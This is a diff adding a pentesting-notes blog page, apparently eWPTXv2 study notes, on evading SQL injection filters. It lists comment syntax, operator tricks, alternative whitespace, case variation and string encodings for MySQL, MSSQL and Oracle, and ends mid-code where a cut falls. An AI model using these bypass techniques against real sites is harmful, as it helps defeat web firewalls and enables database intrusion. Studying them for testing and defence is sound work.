@@ -1,0 +1,1556 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>8 - SQLI Filter Evasion |</title>
+<meta name="description" content="Bypassing Keyword and Function Filters ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="8 - SQLI Filter Evasion">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/sqlievasion/">
+
+
+  <meta property="og:description" content="Bypassing Keyword and Function Filters ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header5.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-01T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/sqlievasion/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header5.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          8 - SQLI Filter Evasion
+
+        
+      </h1>
+      
+        <p class="page__lead">Bypassing Keyword and Function Filters
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  12 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/" class="active">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="8 - SQLI Filter Evasion">
+    <meta itemprop="description" content="Bypassing Keyword and Function Filters">
+    <meta itemprop="datePublished" content="2023-12-01T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#sql-injection-filter-evasion">SQL Injection Filter Evasion</a>
+    <ul>
+      <li><a href="#introduction">Introduction</a></li>
+      <li><a href="#functions-and-operators">Functions and Operators</a></li>
+      <li><a href="#intermediary-characters">Intermediary Characters</a></li>
+      <li><a href="#non-universal-characters">Non Universal characters</a></li>
+      <li><a href="#constants-and-variables">Constants and Variables</a></li>
+      <li><a href="#strings">Strings</a></li>
+      <li><a href="#bypassing-keyword-filters">Bypassing Keyword Filters</a></li>
+      <li><a href="#bypassing-function-filters">Bypassing Function Filters</a></li>
+      <li><a href="#labs">Labs</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="sql-injection-filter-evasion">SQL Injection Filter Evasion</h1>
+
+<p>How WAFs try to protect websites</p>
+
+<p>WAF bypasses</p>
+
+<h2 id="introduction">Introduction</h2>
+<p>SQLi has evolved so much, now we can not only manipulate database and gain access but also DoS, spread malware, phishing, etc</p>
+
+<h3 id="dbms-gadgets">DBMS Gadgets</h3>
+
+<h4 id="comments">Comments</h4>
+<p>Comments are useful to devs For clarifying particular SQL statements</p>
+
+<p>Our pourposes: Commenting out the query and obfuscating portions of our code</p>
+
+<p>MySQL syntax:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://dev.mysql.com/doc/refman/8.0/en/comments.html
+
+<span class="c">#</span>
+<span class="k">*</span> ... <span class="k">*</span>/
+<span class="nt">--</span> -
+<span class="p">;</span>%00
+</code></pre></div></div>
+
+<p>MSSQL syntax:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://msdn.microsoft.com/en-us/library/ff848807.aspx
+/<span class="k">*</span> ... <span class="k">*</span>/
+<span class="nt">--</span> -
+<span class="p">;</span>%00
+</code></pre></div></div>
+
+<p>Oracle syntax:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://docs.oracle.com/cd/B19306_01/server.102/b14200/sql_elements006.htm#i31713
+
+/<span class="k">*</span> ... <span class="k">*</span>/
+<span class="nt">--</span> -
+</code></pre></div></div>
+
+<h2 id="functions-and-operators">Functions and Operators</h2>
+<h3 id="mysql">MySQL</h3>
+<ul>
+  <li>http://dev.mysql.com/doc/refman/5.7/en/functions.html</li>
+</ul>
+
+<p>Magic numbers:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT name from exployees WHERE <span class="nb">id</span><span class="o">=</span><span class="s1">'MAGIC-HERE'</span>
+
+<span class="c"># By manipulating the plus and minus chars we can generate a countless list of the number 1:</span>
+
+<span class="nb">id</span><span class="o">=</span>1
+<span class="nb">id</span><span class="o">=</span><span class="nt">--1</span>
+<span class="nb">id</span><span class="o">=</span>-+-+1
+<span class="nb">id</span><span class="o">=</span><span class="nt">----2---1</span>
+</code></pre></div></div>
+
+<p>Bitwise Functions:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/4.1/en/bit-functions.html#operator_bitwise-invert
+<span class="nb">id</span><span class="o">=</span>1&amp;1
+<span class="nb">id</span><span class="o">=</span>0|1
+<span class="nb">id</span><span class="o">=</span>13^12
+<span class="nb">id</span><span class="o">=</span>8&gt;&gt;3
+<span class="nb">id</span><span class="o">=</span>~-2
+</code></pre></div></div>
+
+<p>Logical operator:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.7/en/logical-operators.html
+<span class="nb">id</span><span class="o">=</span>NOT 0
+<span class="nb">id</span><span class="o">=!</span>0
+<span class="nb">id</span><span class="o">=!</span>1+1
+<span class="nb">id</span><span class="o">=</span>1&amp;&amp;1
+<span class="nb">id</span><span class="o">=</span>1 AND 1
+<span class="nb">id</span><span class="o">=!</span>0 AND <span class="o">!</span>1+1
+<span class="nb">id</span><span class="o">=</span>1 <span class="o">||</span> NULL
+<span class="nb">id</span><span class="o">=</span>1 <span class="o">||</span> <span class="o">!</span>NULL
+<span class="nb">id</span><span class="o">=</span>1 XOR 1
+</code></pre></div></div>
+
+<p>Reguler Expression Operators (REGEX):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.7/en/regexp.html
+<span class="nb">id</span><span class="o">={</span>anything<span class="o">}</span> REGEXP <span class="s1">'.*'</span>
+<span class="nb">id</span><span class="o">={</span>anything<span class="o">}</span> NOT REGEXP <span class="s1">'{randomkeys}'</span>
+<span class="nb">id</span><span class="o">={</span>anything<span class="o">}</span> RLIKE <span class="s1">'.*'</span>
+<span class="nb">id</span><span class="o">={</span>anything<span class="o">}</span> NOT RLIKE <span class="s1">'{randomkeys}'</span>
+</code></pre></div></div>
+
+<p>Comparison Operators:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html
+
+<span class="nb">id</span><span class="o">=</span>GREATEST<span class="o">(</span>0,1<span class="o">)</span>
+<span class="nb">id</span><span class="o">=</span>COALESCE<span class="o">(</span>NULL,1<span class="o">)</span>
+<span class="nb">id</span><span class="o">=</span>ISNULL<span class="o">(</span>1/0<span class="o">)</span>
+<span class="nb">id</span><span class="o">=</span>LEAST<span class="o">(</span>2,1<span class="o">)</span>
+</code></pre></div></div>
+
+<p>In MSSQL we cannot use two equal signs concatenated:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span><span class="o">=</span>1
+<span class="nb">id</span><span class="o">=</span>-+-+1
+<span class="nb">id</span><span class="o">=</span>-+-+-+-+-+-+1
+<span class="nb">id</span><span class="o">=</span>-+-+-+-+-+-+-+-+-+1<span class="k">*</span>-+-+-+-+-+-+-+-+-+1
+</code></pre></div></div>
+
+<p>BitWise Operators:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://msdn.microsoft.com/en-us/library/ms176122.aspx
+
+We can only manipulate using:
+&amp;<span class="o">=(</span>AND<span class="o">)</span>
+|<span class="o">=(</span>OR<span class="o">)</span> 
+^ <span class="o">=</span> <span class="o">(</span>XOR<span class="o">)</span>
+</code></pre></div></div>
+<p>In MySQL there are other operator that we can leveraged For testing the whether or not some conditions are true</p>
+
+<p>→ http://dev.mysql.com/doc/refman/5.7/en/subqueries.html</p>
+
+<p>In SQL Server, these are all grouped in one table:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://msdn.microsoft.com/en-us/library/ms189773.aspx
+However there are not short forms, so 
+<span class="o">&amp;&amp;</span>
+<span class="o">||</span>
+etc... Are not valid <span class="k">in </span>this DBMS
+</code></pre></div></div>
+
+<h3 id="oracle">Oracle</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT name from exployees WHERE <span class="nb">id</span><span class="o">=</span><span class="s1">'MAGIC-HERE'</span>
+</code></pre></div></div>
+
+<p>Oracle is more restrictive</p>
+
+<p>To use arithmetic operators, we must create valid expression to avoid the <strong>missing expression erro</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span><span class="o">=</span>1
+<span class="nb">id</span><span class="o">=</span>-<span class="o">(</span><span class="nt">-1</span><span class="o">)</span>
+<span class="nb">id</span><span class="o">=</span>-<span class="o">(</span>1<span class="o">)</span><span class="k">*</span>-<span class="o">(</span>1<span class="o">)</span>
+</code></pre></div></div>
+
+<p>To combine values, functions and operators into expressions, we must follow the list of Conditions mixed to Expression</p>
+
+<p>→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/conditions.htm#SQLRF005</p>
+
+<p>→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/expressions.htm#SQLRF004</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT name from employees where <span class="nb">id</span><span class="o">=</span>some<span class="o">(</span>1<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="intermediary-characters">Intermediary Characters</h2>
+<ul>
+  <li>Blank spaces are useful in separating functions, operators, declarations, and so forth, basically intermediary characters.</li>
+  <li>However, there is non-common characters that can be user</li>
+</ul>
+
+<h3 id="mysql-1">MySQL</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT[CHAR]name[CHAR]from[CHAR]employees
+</code></pre></div></div>
+
+<p>Universal characters allowed as whitespaces:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Codepoint</td>
+      <td>Character</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>U+0009</td>
+      <td>= character tabulation</td>
+    </tr>
+    <tr>
+      <td>10</td>
+      <td>U+000A</td>
+      <td>= Life feed (LF)</td>
+    </tr>
+    <tr>
+      <td>11</td>
+      <td>U+000B</td>
+      <td>= Line  Tabulation</td>
+    </tr>
+    <tr>
+      <td>12</td>
+      <td>U+000C</td>
+      <td>= Form feed</td>
+    </tr>
+    <tr>
+      <td>13</td>
+      <td>U+000D</td>
+      <td>= Carriage return (CR)</td>
+    </tr>
+    <tr>
+      <td>32</td>
+      <td>U+0020</td>
+      <td>= Space</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="mssql">MSSQL</h3>
+<p>The list of Universal characters allowed as a whitespace are large. Essentially, all the ASCII Control Characters, the space and the no-break space are allowed.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Codepoint</td>
+      <td>Character</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>160</td>
+      <td>U+00A0</td>
+      <td>= No-break space</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="oracle-1">Oracle</h3>
+<p>There are 7 characters in total</p>
+
+<p>All the mysql table + the NULL char:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Codepoint</td>
+      <td>Character</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>0</td>
+      <td>U+0000</td>
+      <td>// NULL</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="non-universal-characters">Non Universal characters</h2>
+
+<h3 id="mysql--mssql--oracle">Mysql / MSSQL / Oracle</h3>
+<p>Plus Sign (+)</p>
+
+<p>In all the DBMS we can use the (+) to separate almost all the keywords except <strong>FROM</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT+name FROM exployees WHERE+id<span class="o">=</span>1 AND+name LIKE+<span class="s1">'J%'</span>
+</code></pre></div></div>
+
+<p>In all DMBS depending on the context ,we can also use</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Parenthesis <span class="o">()</span>
+Operators
+Quotes 
+and of course the C-Style comments /<span class="k">**</span>/
+</code></pre></div></div>
+
+<h2 id="constants-and-variables">Constants and Variables</h2>
+<ul>
+  <li>Constants (AKA Reserved Words)</li>
+  <li>Knowing the SQL keywords is a must</li>
+  <li>System Variables also can be very useful</li>
+</ul>
+
+<h3 id="mysql-2">MySQL</h3>
+<p>The only way to obfuscate keywords is by manipulating upper/lower case variations like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sELeCt
+SELect
+etc
+</code></pre></div></div>
+
+<p>System Variables</p>
+
+<p>→ http://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html</p>
+
+<p>We can use the statement:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHOW VARIABLES
+</code></pre></div></div>
+
+<p>The list is large, if u want to retrieve a specific value, just add @@ before the variable name:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@@version
+</code></pre></div></div>
+
+<p>User Variables:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET @myvar<span class="o">={</span>expression<span class="o">}</span>
+SET @myvar:<span class="o">={</span>expression<span class="o">}</span>
+</code></pre></div></div>
+
+<h3 id="mssql-1">MSSQL</h3>
+<p>Keywords</p>
+
+<p>→ http://msdn.microsoft.com/en-us/library/ms189822.aspx</p>
+
+<p>This list displays not only SQL reserved words, but also system functions</p>
+
+<ul>
+  <li>Info about configuration and more is organized as Built-in Functions</li>
+</ul>
+
+<p>→ http://technet.microsoft.com/en-us/library/ms174318(v=sql.110).aspx</p>
+
+<p>There are primarily four types of functions, closer to variable are <strong>Scalar Functions</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@@version // its a Scalar <span class="k">function</span>
+</code></pre></div></div>
+
+<h3 id="oracle-2">Oracle</h3>
+<p>Particular management of Words</p>
+
+<p>→ https://docs.oracle.com/cd/B10501_01/appdev.920/a42525/apb.htm</p>
+
+<p>There are both Reserved Words, the words that cannot be redefined, and Keywords, words always important but can be redefined by the user</p>
+
+<p>Example: we can create a table <strong>DATABASE</strong> cause the keyword is not Reserved:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE TABLE DATABASE <span class="o">(</span><span class="nb">id </span>number<span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="strings">Strings</h2>
+<p>Lets see techniques that are helpful in the creation, manipulation and obfuscation of strings</p>
+
+<h3 id="regular-notations">Regular Notations</h3>
+
+<h4 id="mysql-3">MYSQL</h4>
+<p>To define a string we can use:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>single quote  <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
+double quotes <span class="o">(</span><span class="s2">""</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>To define string literals:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_latin1<span class="s1">'string'</span>
+</code></pre></div></div>
+
+<p>The character set that can be used has approximately 40 possible values and can use any of them preceded by an underscore character:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT _ascii<span class="s1">'Break Me'</span>
+</code></pre></div></div>
+
+<p>U can use N’literal’ or n’niteral’ to create a string in the National character Set: http://dev.mysql.com/doc/refman/5.7/en/charset-national.html</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT N<span class="s1">'mystring'</span>
+</code></pre></div></div>
+
+<p>Hexadecimal</p>
+
+<p>→ https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT X<span class="s1">'4F485045'</span>
+SELECT 0x4F485045
+</code></pre></div></div>
+
+<p>Bit Literals</p>
+
+<p>→ https://dev.mysql.com/doc/refman/5.7/en/bit-value-literals.html</p>
+
+<p>Using like B’literal’ or b’literal’:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'a'</span><span class="o">=</span>B<span class="s1">'1100001'</span> <span class="c">#TRUE</span>
+</code></pre></div></div>
+
+<h4 id="mssql-2">MSSQL</h4>
+<p>It defines the literal as either constant or scalar value.</p>
+
+<ul>
+  <li>can be defined only by using single quotes (<strong>’ ‘</strong>)</li>
+</ul>
+
+<p>If the QUOTED_IDENTIFIER options is enabled, then we can use double quotes (<strong>” “</strong>)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'Hello'</span>
+</code></pre></div></div>
+
+<h4 id="oracle-3">OrACLE</h4>
+<p>Also does not allow double quotes. But we can use National notation
+→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/sql_elements003.htm#SQLRF00218</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'Hello'</span>
+SELECT N<span class="s1">'Hello'</span>
+SELECT q<span class="s1">'[Hello]'</span>
+SELECT Q<span class="s1">'{Hello}'</span>
+SELECT nQ<span class="s1">'("admin")'</span>
+</code></pre></div></div>
+
+<h3 id="unicode">Unicode</h3>
+<p>MYSQL:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://dev.mysql.com/doc/refman/5.5/en/charset-collation-effect.html
+
+Documented above:
+SELECT <span class="s1">'admin'</span><span class="o">=</span><span class="s1">'âđɱȋň'</span> <span class="c">#TRUE</span>
+</code></pre></div></div>
+
+<h3 id="escaping">Escaping</h3>
+<p>Using backslash before both single and double quotes</p>
+
+<p>→ https://dev.mysql.com/doc/refman/8.0/en/string-literals.html</p>
+
+<p>However there are also other special characters used to escapse:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'He\'</span>llo<span class="s1">'
+SELECT '</span>He<span class="se">\%\_</span>llo<span class="s1">'
+</span></code></pre></div></div>
+
+<p>Furthermore, to escape quotes we can use the same character two times:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'He''llo'</span>
+SELECT <span class="s2">"He""llo"</span>
+</code></pre></div></div>
+
+<p>If we try to escape a character that does not have a respective escaping sequence, the backslash will be ignored:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'\H\e\l\l\o'</span>
+SELECT <span class="s1">'He\ll\o'</span>
+</code></pre></div></div>
+
+<p>In MSSQL and Oracle, u can escape single quotes by using two single quotes:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'He''llo'</span>
+</code></pre></div></div>
+
+<h3 id="concatenation">Concatenation</h3>
+<p>For quoted strings, concatenation can be performed by placing the string next to each other:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="s1">'he'</span> <span class="s1">'ll'</span> <span class="s1">'o'</span>
+</code></pre></div></div>
+
+<p>As an alternative, we can use functions like CONCAT and CONCAT_WS</p>
+
+<p>→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat</p>
+
+<p>→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat-ws</p>
+
+<p>WS stand For <strong>with separator</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT CONCAT<span class="o">(</span><span class="s1">'He'</span>,<span class="s1">'ll'</span>,<span class="s1">'o'</span><span class="o">)</span>
